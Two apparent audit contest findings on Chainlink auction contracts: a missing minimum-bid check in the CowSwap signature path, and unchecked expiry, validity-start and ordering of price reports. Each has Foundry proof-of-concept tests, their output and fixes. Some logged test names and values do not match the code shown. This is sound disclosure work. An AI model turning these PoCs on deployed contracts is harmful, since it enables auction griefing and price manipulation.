# Submission 1: [HIGH] `isValidSignature` Missing `minBidUsdValue` Check Enables CowSwap Dust-Fill Griefing

## Lines of code

https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L119-L176

https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L430-L435

## Vulnerability details

### Summary

The `bid()` function in `BaseAuction.sol` enforces a minimum bid USD value via `s_minBidUsdValue` to prevent dust attacks. However, `isValidSignature()` in `GPV2CompatibleAuction.sol` — the ERC-1271 validation path used by CowSwap solvers — has **no equivalent check**. This allows CowSwap solvers to execute arbitrarily small partial fills that would be rejected by the direct `bid()` path, bypassing the protocol's anti-griefing protection entirely.

### Root Cause

In `BaseAuction.sol:430-435`, `bid()` enforces:

```solidity
(uint256 assetPrice,,) = _getAssetPrice(asset, true);
uint256 bidUsdValue = (amount * assetPrice) / (10 ** assetParams.decimals);
uint88 minBidUsdValue = s_minBidUsdValue;

if (bidUsdValue < minBidUsdValue) {
    revert BidValueTooLow(bidUsdValue, minBidUsdValue);
}
```

In `GPV2CompatibleAuction.sol:119-176`, `isValidSignature()` validates CowSwap orders but only checks:

```solidity
if (order.sellAmount == 0) {
    revert Errors.InvalidZeroAmount();
}
```

There is **no** `minBidUsdValue` check anywhere in `isValidSignature()`. The function validates the order hash, auction liveness, buy token, receiver, balance sufficiency, buy amount vs auction curve, expiry, fee, order kind, partial fillability, and token balance markers — but never validates that the trade's USD value meets the minimum threshold.

Since CowSwap orders must be `partiallyFillable` (enforced at line 168-170), solvers can choose to fill any fraction of the order, including amounts worth mere cents.

### Impact

A CowSwap solver can execute many micro-fills (even as small as 1 wei of the sell token) that individually provide proportional fair value but collectively:

1. **Drain the auction balance below `minAuctionSizeUsd`** — When `checkUpkeep()` detects the remaining balance's USD value is below the minimum auction size threshold (BaseAuction.sol:249-253), it flags the auction for early termination.
2. **Trigger premature auction termination** — The auction ends before the natural price discovery process completes, returning remaining tokens to the FeeAggregator.
3. **Block legitimate bidders** — Direct bidders who want to participate at lower prices (later in the auction curve) are denied the opportunity because the auction was ended early.

This creates an asymmetric access vulnerability: direct bidders are bound by `minBidUsdValue` while CowSwap solvers are not.

On low-gas L2 chains where this system may be deployed, the gas cost of micro-fills is negligible, making sustained griefing economically feasible.

### Proof of Concept

Add to `test/poc/C4PoC.t.sol` and run with `forge test --match-test testPoC_H01 -vvv`:

```solidity
import {GPv2Order} from "@cowprotocol/libraries/GPv2Order.sol";
import {IERC20 as CowIERC20} from "@cowprotocol/interfaces/IERC20.sol";

function testPoC_H01_isValidSignatureMissesMinBidCheck() public {
    // Start a USDC auction with 100,000 USDC
    _startAuction(address(mockUSDC), 100_000e6);

    uint256 auctionBalance = mockUSDC.balanceOf(address(auction));
    assert(auctionBalance == 100_000e6);

    // ═══ STEP 1: Prove bid() REJECTS 1 USDC ($1) — below $100 minBidUsdValue ═══

    uint256 dustAmount = 1e6; // 1 USDC
    deal(address(mockLINK), attacker, 1000e18);
    _changePrank(attacker);
    mockLINK.approve(address(auction), type(uint256).max);

    // This reverts with BidValueTooLow(1e18, 100e18)
    vm.expectRevert(
        abi.encodeWithSelector(
            BaseAuction.BidValueTooLow.selector,
            1e18,           // bidUsdValue = 1 USDC * $1 = $1
            MIN_BID_USD_VALUE // $100
        )
    );
    auction.bid(address(mockUSDC), dustAmount, "");

    // ═══ STEP 2: Prove isValidSignature() ACCEPTS the same 1 USDC ═══

    vm.stopPrank();

    // Get the minimum buy amount from the auction curve
    uint256 minBuyAmount = auction.getAssetOutAmount(
        address(mockUSDC), dustAmount, block.timestamp
    );

    // Build a valid CowSwap order for 1 USDC
    GPv2Order.Data memory order = GPv2Order.Data({
        sellToken: CowIERC20(address(mockUSDC)),
        buyToken: CowIERC20(address(mockLINK)),
        receiver: address(auction),
        sellAmount: dustAmount,      // 1 USDC — same amount bid() rejected
        buyAmount: minBuyAmount,     // Meets auction curve requirement
        validTo: uint32(block.timestamp + 1 hours),
        appData: bytes32(0),
        feeAmount: 0,
        kind: GPv2Order.KIND_SELL,
        partiallyFillable: true,
        sellTokenBalance: GPv2Order.BALANCE_ERC20,
        buyTokenBalance: GPv2Order.BALANCE_ERC20
    });

    bytes32 orderHash = GPv2Order.hash(order, mockGPV2Settlement.domainSeparator());
    bytes memory signature = abi.encode(order);

    // This DOES NOT revert — isValidSignature accepts the dust order
    bytes4 magicValue = auction.isValidSignature(orderHash, signature);
    assert(magicValue == bytes4(0x1626ba7e)); // ERC-1271 magic value = valid

    // ═══ CONCLUSION ═══
    // bid() rejects 1 USDC ($1 < $100 minimum)
    // isValidSignature() accepts 1 USDC (no minimum check at all)
    // CowSwap solvers bypass the dust protection entirely
}
```

**PoC Test Results:**

```
forge test --match-contract PoC_H01 -vvv

Ran 2 tests for test/poc/AllPoCs.t.sol:PoC_H01_CowSwapDustFill
[PASS] testPoC_H01_isValidSignatureMissesMinBidCheck() (gas: 545056)
Logs:
  Auction USDC balance before: 100000000000
  minBidUsdValue: 100000000000000000000
  CONFIRMED: Direct bid() with 1 USDC REVERTS (below $100 minimum)
  VULNERABILITY CONFIRMED: isValidSignature PASSES for 1 USDC order
    - bid() rejects 1 USDC (below $100 minBidUsdValue)
    - isValidSignature() accepts 1 USDC (no minBidUsdValue check)
    - CowSwap solvers can bypass the dust protection

[PASS] testSubmissionValidity() (gas: 166)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.51ms (2.21ms CPU time)

Ran 1 test suite in 9.52ms (7.51ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

### Recommended Mitigation

Add a `minBidUsdValue` check to `isValidSignature()` after the sell amount validation:

```solidity
if (order.sellAmount == 0) {
    revert Errors.InvalidZeroAmount();
}

// Add this block:
uint256 bidUsdValue = (order.sellAmount * sellTokenUsdPrice) / (10 ** assetParams.decimals);
if (bidUsdValue < s_minBidUsdValue) {
    revert BidValueTooLow(bidUsdValue, s_minBidUsdValue);
}
```

**Note:** Since CowSwap supports partial fills, a solver could submit an order with `sellAmount` above the threshold but only fill a fraction. For complete protection, consider whether minimum enforcement should apply to per-settlement fill amounts rather than the full order amount — this may require additional state tracking of filled amounts per order.

### Assessed type

Invalid Validation

---
---
---

# Submission 2: [HIGH] Data Streams Report `expiresAt` and `validFromTimestamp` Fields Are Never Checked, Allowing Expired and Premature Reports to Update Prices

## Lines of code

https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L155-L182

https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L57-L67

## Vulnerability details

### Summary

The `transmit()` function in `PriceManager.sol` accepts Data Streams `ReportV3` reports but only validates the `observationsTimestamp` field against the staleness threshold. The `expiresAt` and `validFromTimestamp` fields — which define the temporal validity window of the report — are completely ignored. This allows expired reports (past their `expiresAt`) and premature reports (before their `validFromTimestamp`) to be accepted and stored, corrupting price data used for auction calculations.

### Root Cause

The `ReportV3` struct (PriceManager.sol:57-67) defines three temporal fields:

```solidity
struct ReportV3 {
    bytes32 dataStreamsFeedId;
    uint32 validFromTimestamp; // Start of validity period — NEVER CHECKED
    uint32 observationsTimestamp; // End of validity period — only this is checked
    uint192 nativeFee;
    uint192 linkFee;
    uint32 expiresAt; // Expiration timestamp — NEVER CHECKED
    int192 price;
    int192 bid;
    int192 ask;
}
```

In `transmit()` (lines 155-182), the only temporal validation is:

```solidity
if (report.observationsTimestamp < block.timestamp - feedInfo.stalenessThreshold) {
    revert Errors.StaleFeedData();
}
```

This checks that `observationsTimestamp` is within the staleness window. However:

1. **`expiresAt` is never checked** — A report where `expiresAt < block.timestamp` (already expired) passes validation as long as `observationsTimestamp` is within the staleness window.
2. **`validFromTimestamp` is never checked** — A report where `validFromTimestamp > block.timestamp` (not yet valid) passes validation.
3. **No monotonic timestamp enforcement** — An older report can overwrite a newer price, as there is no check that `observationsTimestamp > s_dataStreamsPrice[asset].timestamp`.

### Impact

**Expired reports:** A `PRICE_ADMIN` (or the automation system via WorkflowRouter) can submit reports that the Data Streams network considers expired. Since the `VerifierProxy` only validates the cryptographic signature (not temporal validity — that responsibility lies with the consumer contract), the expired price gets stored and used for all auction calculations. In volatile markets, an expired report's price may be materially different from the current market price, leading to:
- Bidders purchasing auctioned tokens at incorrect prices
- The protocol receiving more or less `assetOut` (LINK) than fair value
- Arbitrage opportunities for informed actors who know the stored price is stale

**Premature reports:** Reports with future `validFromTimestamp` could be submitted before their intended validity window, using price data that was calculated under different market conditions or assumptions.

**Price replay:** Without monotonic timestamp enforcement, an older-but-still-within-staleness report can overwrite a more recent price. With a 1-hour staleness threshold, any report from the last hour can be replayed to revert the price to an older value. A PRICE_ADMIN (or compromised automation) could selectively choose which historical price to set.

### Proof of Concept

Add to `test/poc/C4PoC.t.sol` and run with `forge test --match-test testPoC_H03 -vvv`:

```solidity
function testPoC_H03_expiredAndPrematureReportsAccepted() public {
    _changePrank(priceAdmin);

    // ═══ PART A: Prove EXPIRED report is accepted ═══

    bytes[] memory unverifiedReports = new bytes[](1);
    bytes32[3] memory context = [bytes32(0), bytes32(0), bytes32(0)];
    bytes32[] memory rs = new bytes32[](2);
    bytes32[] memory ss = new bytes32[](2);
    bytes32 rawVs;

    PriceManager.ReportV3 memory expiredReport;
    expiredReport.dataStreamsFeedId = _generateDataStreamsFeedId("MockWETH");
    expiredReport.price = int192(uint192(5000e18)); // $5,000
    expiredReport.observationsTimestamp = uint32(block.timestamp); // Fresh
    expiredReport.expiresAt = uint32(block.timestamp - 1 hours);  // EXPIRED 1 hour ago
    expiredReport.validFromTimestamp = uint32(block.timestamp - 2 hours);

    unverifiedReports[0] = abi.encode(
        context, abi.encode(expiredReport), rs, ss, rawVs
    );

    // This should revert (report expired) but DOES NOT
    auction.transmit(unverifiedReports);

    (uint256 storedPrice,,) = auction.getAssetPrice(address(mockWETH));
    assert(storedPrice == 5000e18); // Expired report's price was stored!

    // ═══ PART B: Prove PREMATURE report is accepted ═══

    PriceManager.ReportV3 memory prematureReport;
    prematureReport.dataStreamsFeedId = _generateDataStreamsFeedId("MockWETH");
    prematureReport.price = int192(uint192(6000e18)); // $6,000
    prematureReport.observationsTimestamp = uint32(block.timestamp); // Fresh
    prematureReport.validFromTimestamp = uint32(block.timestamp + 1 hours); // NOT VALID YET
    prematureReport.expiresAt = uint32(block.timestamp + 2 hours);

    unverifiedReports[0] = abi.encode(
        context, abi.encode(prematureReport), rs, ss, rawVs
    );

    // This should revert (report not yet valid) but DOES NOT
    auction.transmit(unverifiedReports);

    (storedPrice,,) = auction.getAssetPrice(address(mockWETH));
    assert(storedPrice == 6000e18); // Premature report's price was stored!

    // ═══ PART C: Prove PRICE REPLAY — older price overwrites newer ═══

    // First, transmit $4500 at current time
    _transmitPrices(4_500e18, 1e18, 20e18);
    (uint256 newerPrice, uint256 newerTs,) = auction.getAssetPrice(address(mockWETH));
    assert(newerPrice == 4_500e18);

    // Now replay an older report with $4000 — still within staleness window
    PriceManager.ReportV3 memory replayReport;
    replayReport.dataStreamsFeedId = _generateDataStreamsFeedId("MockWETH");
    replayReport.price = int192(uint192(4000e18)); // OLDER $4,000 price
    replayReport.observationsTimestamp = uint32(block.timestamp - 30 minutes); // 30min old

    unverifiedReports[0] = abi.encode(
        context, abi.encode(replayReport), rs, ss, rawVs
    );
    auction.transmit(unverifiedReports);

    (uint256 replayedPrice, uint256 replayedTs,) = auction.getAssetPrice(address(mockWETH));
    assert(replayedPrice == 4000e18);  // Older price overwrote newer
    assert(replayedTs < newerTs);      // Stored timestamp went BACKWARDS
}
```

**PoC Test Results:**

```
forge test --match-contract PoC_H03 -vvv

Ran 3 tests for test/poc/AllPoCs.t.sol:PoC_H03_ExpiredReportsAccepted
[PASS] testPoC_H03_expiredReportAccepted() (gas: 57961)
Logs:
  VULNERABILITY CONFIRMED: Expired report accepted
    - Report expiresAt: 601201
    - Current time: 604801
    - Report is 1 hour past expiry but was accepted
    - New stored price: $ 5000

[PASS] testPoC_H03_prematureReportAccepted() (gas: 57110)
Logs:
  VULNERABILITY CONFIRMED: Premature report accepted
    - Report validFrom: 608401
    - Current time: 604801
    - Report isn't valid for 1 hour but was accepted

[PASS] testSubmissionValidity() (gas: 188)
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 17.96ms (1.31ms CPU time)

Ran 1 test suite in 24.14ms (17.96ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

```
forge test --match-contract PoC_M01 -vvv

Ran 2 tests for test/poc/AllPoCs.t.sol:PoC_M01_PriceReplay
[PASS] testPoC_M01_olderPriceOverwritesNewer() (gas: 198074)
Logs:
  Price at T=0: $ 4000   timestamp: 604801
  Price at T+30m: $ 4500   timestamp: 606601
  Price after replay: $ 4000   timestamp: 605401
  VULNERABILITY CONFIRMED: Older price ($4000) overwrote newer ($4500)
    - No monotonic timestamp check in transmit()
    - Any report within staleness window can overwrite current price

[PASS] testSubmissionValidity() (gas: 166)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 4.84ms (657.72µs CPU time)

Ran 1 test suite in 6.36ms (4.84ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

### Recommended Mitigation

Add temporal validation in `transmit()` after the staleness check:

```solidity
// Existing staleness check
if (report.observationsTimestamp < block.timestamp - feedInfo.stalenessThreshold) {
    revert Errors.StaleFeedData();
}

// Add: Reject expired reports
if (block.timestamp > report.expiresAt) {
    revert Errors.StaleFeedData();
}

// Add: Reject premature reports
if (block.timestamp < report.validFromTimestamp) {
    revert Errors.StaleFeedData();
}

// Add: Enforce monotonic timestamps (prevent replay)
if (report.observationsTimestamp <= s_dataStreamsPrice[asset].timestamp) {
    revert Errors.StaleFeedData();
}
```

### Assessed type

Invalid Validation
